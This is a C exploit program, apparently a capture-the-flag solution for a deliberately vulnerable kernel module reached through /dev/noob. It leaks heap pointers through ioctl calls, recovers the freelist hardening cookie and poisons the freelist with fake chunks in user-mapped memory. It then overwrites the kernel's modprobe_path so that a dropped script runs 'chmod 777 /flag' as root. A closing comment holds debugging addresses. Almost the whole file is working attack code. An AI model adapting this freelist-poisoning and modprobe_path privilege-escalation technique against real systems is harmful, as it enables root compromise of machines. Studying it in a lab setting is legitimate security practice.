#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>
#include <sys/auxv.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#define CMD_ALLOC 0x30000
#define CMD_FREE  0x30001
#define CMD_EDIT  0X30002
#define CMD_SHOW  0x30003
#define BUF_SIZE 0x60

struct arg_t {
    signed long idx;
    void* uaddr;
    size_t size;
};

size_t alloc(int fd, signed long idx, size_t size) {
    struct arg_t arg = {
        .idx = idx,
        .size = size
    };
    int ret = ioctl(fd, CMD_ALLOC, &arg);
    if (ret < 0) {
        perror("alloc error");
        exit(EXIT_FAILURE);
    }
    return ret;
}

size_t delete(int fd, signed long idx) {
    struct arg_t arg = {
        .idx = idx,
    };
    int ret = ioctl(fd, CMD_FREE, &arg);
    if (ret < 0) {
        perror("free error");
        exit(EXIT_FAILURE);
    }
    return ret;
}

void edit(int fd, signed long idx, void *uaddr, size_t size) {
    struct arg_t arg = {
        .idx = idx,
        .uaddr = uaddr,
        .size = size
    };
    int ret = ioctl(fd, CMD_EDIT, &arg);
    if (ret < 0) {
        perror("edit error");
        exit(EXIT_FAILURE);
    }
}

void show(int fd, signed long idx, void *uaddr, size_t size) {
    struct arg_t arg = {
        .idx = idx,
        .uaddr = uaddr,
        .size = size
    };
    int ret = ioctl(fd, CMD_SHOW, &arg);
    if (ret < 0) {
        perror("show error");
        exit(EXIT_FAILURE);
    }
}

void gen_test(){
    puts("[+] Prepare chmod file.");
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /home/pwn/a");
    system("chmod +x /home/pwn/a");

    puts("[+] Prepare trigger file.");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/fake");
    system("chmod +x /home/pwn/fake");
}

void exploit() {
    int fd = open("/dev/noob", O_RDONLY);
    if (fd < 0) {
        perror("open /dev/noob");
        exit(EXIT_FAILURE);
    }

    char buf[BUF_SIZE];
    memset(buf, 0, BUF_SIZE);
    size_t mod_base = 0xffffffffc0002000;
// Step 1: leak heap_base address   
    size_t potential_ptr = 0;
    size_t ptr = 0;
    int victim_idx[2] = {0};
    size_t victim_ptr[2] = {0};

    int victim_cnt = 0;
    for (int i=0; i < 0x18; i++) {
        if (victim_cnt >= 2) break; // 一旦 0x28处是堆地址，则记录下来。总共记录两个偏移0x28处为堆地址的块

        alloc(fd, i, BUF_SIZE);
        show(fd, i, buf, BUF_SIZE);
        potential_ptr = ((size_t *)(buf))[5];
        ptr = ((potential_ptr & 0xffff000000000000)  ? potential_ptr - 0x28 : ptr);
        if ((((size_t *)(buf))[5] == ((size_t *)(buf))[6]) && (ptr)) { // https://kirin-say.top/2020/03/10/Kernoob-kmalloc-without-SMAP/ 这里是这样判断的
            victim_idx[victim_cnt] = i;
            victim_ptr[victim_cnt] = ptr;
            victim_cnt++;
        }
        memset(buf, 0, BUF_SIZE);
        potential_ptr = 0;
        ptr = 0;
    }

    printf("idx: %d, ptr: %lx\n", victim_idx[0], victim_ptr[0]);
    printf("idx: %d, ptr: %lx\n", victim_idx[1], victim_ptr[1]);

// Step 2: leak cookie
    delete(fd, victim_idx[0]);
    delete(fd, victim_idx[1]); // freelist -> chunk 1 -> chunk 0 

    memset(buf, 0, BUF_SIZE);
    show(fd, victim_idx[0], buf, BUF_SIZE); 
    size_t leak0 = ((size_t *)(buf))[0]; // chunk0是freelist中最后一个，所以其fd = cookies ^ chunk_addr，根据fd和chunk0_addr 求出 cookie。
    printf("leak0: %lx\n", leak0);

    memset(buf, 0, BUF_SIZE);
    show(fd, victim_idx[1], buf, BUF_SIZE);
    size_t leak1 = ((size_t *)(buf))[0];
    printf("leak1: %lx\n", leak1);

    size_t cookie = leak0 ^ victim_ptr[0];
    printf("cookie: %lx\n", cookie);

    sleep(10);

// Step 3:  fast-bin-attach  &  bypass prefetch check
    size_t magic = (cookie ^ mod_base) >> 32;
    printf("magic: %llx\n", magic);

    size_t fake_user_mem1 = mmap(magic & 0xffff0000, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,0,0);
    printf("fake_user_mem1: %lx\n", fake_user_mem1);
    size_t fake_FD = cookie ^ magic;
    memcpy(magic, &fake_FD, 8);

    size_t fake_ptr2 = (0xffffffffc000464c ^ cookie) & 0xffffffff;
    printf("fake_ptr2: %lx\n", fake_ptr2);
    size_t fake_user_mem2 = mmap(fake_ptr2 & 0xffff0000, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,0,0);
    printf("fake_user_mem2: %lx\n", fake_user_mem2);
    size_t fake_ptr3 = cookie ^ fake_ptr2;
    memcpy(fake_ptr2, &fake_ptr3, 8);

    size_t target0 = cookie ^ victim_ptr[1] ^ magic;
    size_t target1 = cookie ^ victim_ptr[0] ^ 0xffffffffc000464c;

    edit(fd, victim_idx[1], &target0, 8);
    edit(fd, victim_idx[0], &target1, 8);

    //write 4 bytes on pool
    alloc(fd, 0x18, BUF_SIZE);
    alloc(fd, 0x19, BUF_SIZE);  // pool[0x19] = magic ^ cookie 

    //allocate pool address
    alloc(fd, 0x1a, BUF_SIZE);
    alloc(fd, 0x1b, BUF_SIZE);  // chunk on the pool

    // consume fake_ptr2 on freelist to prevent crash;
    alloc(fd, 0x1c, BUF_SIZE);

    size_t modprobe_path = 0xffffffff8245aba0;
    char overwrite[12] = {0};
    memcpy(overwrite+4, &modprobe_path, 8);
    edit(fd, 0x1b, overwrite, 12);

    char *path = "/home/pwn/a\x00\x00\x00\x00\x00";
    edit(fd, 0x19, path, 16);
}

int main(int argc, char *argv[]) {
  (void)argc; (void)argv;

    gen_test();
    exploit();
    system("cat /proc/sys/kernel/modprobe");
    return 0;
}
/*
/home/pwn # cat /sys/module/noob/sections/.text
0xffffffffc0002000
/home/pwn # cat /sys/module/noob/sections/.bss
0xffffffffc00044c0


add_note
0xffffffffc00020CC                 call    __kmalloc             b *0xffffffffc00020CC
edit_note
0xffffffffc0002421                 call    _copy_from_user
0xBC0 pool  0xffffffffc00044c0

0xffffffffc0004650 pool上下标为25，0x19

x /80xg 0xffffffffc00044c0

58c8b11000000000


*/